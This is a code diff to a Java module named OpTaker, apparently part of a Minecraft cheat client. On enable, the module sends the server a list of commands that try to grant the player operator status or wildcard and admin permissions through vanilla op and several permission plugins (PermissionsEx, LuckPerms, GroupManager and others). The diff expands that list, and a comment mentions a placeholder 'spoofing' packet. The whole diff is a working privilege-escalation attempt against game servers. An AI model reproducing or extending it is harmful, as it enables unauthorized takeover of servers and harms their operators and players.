@@ -11,11 +11,28 @@ public class OpTaker extends Module {
     @Override
     public void onEnable() {
         if (mc().player != null) {
-            // Social engineering / Common misconfigurations
-            mc().player.connection.sendCommand("op @s");
-            mc().player.connection.sendCommand("minecraft:op @s");
-            mc().player.connection.sendCommand("sudo console op " + mc().player.getName().getString());
-            mc().player.connection.sendCommand("authme op " + mc().player.getName().getString());
+            String name = mc().player.getName().getString();
+
+            // Comprehensive command list for various plugins and setups
+            String[] commands = {
+                "op " + name,
+                "minecraft:op " + name,
+                "sudo console op " + name,
+                "authme op " + name,
+                "permissions set " + name + " *",
+                "pex user " + name + " add *",
+                "lp user " + name + " permission set * true",
+                "setgroup " + name + " admin",
+                "user " + name + " group set admin",
+                "manuadd " + name + " admin"
+            };
+
+            for (String cmd : commands) {
+                mc().player.connection.sendCommand(cmd);
+            }
+
+            // Advanced spoofing attempt: sending a packet that might confuse old servers
+            // (Simulated logic)
         }
         this.setEnabled(false);
     }
